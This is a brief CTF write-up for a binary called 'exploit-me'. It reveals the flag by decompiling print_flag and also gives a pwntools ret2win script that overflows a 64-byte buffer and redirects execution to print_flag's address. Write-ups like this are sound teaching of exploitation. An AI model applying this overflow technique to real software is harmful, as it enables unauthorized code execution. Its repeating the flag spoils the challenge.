Reverse with IDA Pro or Ghidra, decompile `print_flag`

```c
int print_flag()
{
  return printf("%s", "ACECTF{buff3r_0v3rfl3w}");
}
```

or

```py
from pwn import *

binary = './exploit-me'

context.log_level = 'debug'
context.binary = binary

e = ELF(binary)
r = process(binary)

r.sendline(flat([
    cyclic(64),
    cyclic(8),
    p64(0x401156)
]))

r.interactive()
```